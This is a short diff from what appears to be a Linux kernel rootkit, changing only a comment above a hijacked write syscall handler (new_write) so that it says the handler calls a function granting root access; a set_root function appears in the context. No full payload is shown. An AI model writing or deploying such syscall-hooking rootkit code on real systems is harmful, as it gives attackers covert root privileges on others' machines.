@@ -241,7 +241,7 @@ void set_root(void) {
   }
 }
 
-// the new modified write function
+// the new modified write function that will call the method that gives root access.
 asmlinkage int new_write(unsigned int fd, const char __user *buf, size_t count) {
 
   // printk(KERN_ALERT "WRITE HIJACKED");
